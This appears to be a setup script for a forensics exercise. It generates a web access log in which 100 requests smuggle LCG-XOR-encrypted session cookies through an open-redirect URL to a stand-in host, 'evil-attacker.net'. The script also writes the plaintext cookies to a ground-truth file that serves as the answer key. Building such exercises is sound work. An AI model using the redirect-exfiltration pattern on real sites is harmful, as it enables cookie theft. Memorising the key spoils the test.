#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    tesseract-ocr \
    imagemagick \
    fonts-dejavu-core \
    rustc \
    cargo \
    iptables

pip3 install pytest

mkdir -p /app/truth
mkdir -p /home/user

# Modify ImageMagick policy to allow text rendering if needed
sed -i 's/pattern="PS"/pattern="PS" rights="read|write"/g' /etc/ImageMagick-6/policy.xml || true

# Generate screenshot
convert -size 400x100 xc:white -font DejaVu-Sans -pointsize 20 -fill black -draw "text 10,50 'INITIALIZATION SEED: 31337'" /app/attacker_screenshot.png

# Generate logs and ground truth
cat << 'EOF' > /tmp/generate.py
import random
import string
import binascii

seed = 31337

def lcg(state):
    return (1103515245 * state + 12345) % (2**31)

def encrypt(plaintext, seed):
    state = seed
    ciphertext = bytearray()
    for char in plaintext:
        state = lcg(state)
        keystream_byte = state & 0xFF
        ciphertext.append(ord(char) ^ keystream_byte)
    return binascii.hexlify(ciphertext).decode('utf-8')

with open('/app/truth/golden_cookies.txt', 'w') as f_truth, open('/app/access.log', 'w') as f_log:
    # 1000 normal
    for i in range(1000):
        ip = f"10.0.0.{random.randint(1, 254)}"
        f_log.write(f'{ip} - - [10/Oct/2023:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 -\n')

    # 100 malicious
    for i in range(100):
        cookie = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        f_truth.write(cookie + '\n')
        encrypted = encrypt(cookie, seed)
        f_log.write(f'192.168.1.55 - - [10/Oct/2023:13:55:36 -0700] "GET /login?next=http://evil-attacker.net/log?exfil_data={encrypted} HTTP/1.1" 302 -\n')
EOF

python3 /tmp/generate.py
rm /tmp/generate.py

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user
chmod -R 755 /app
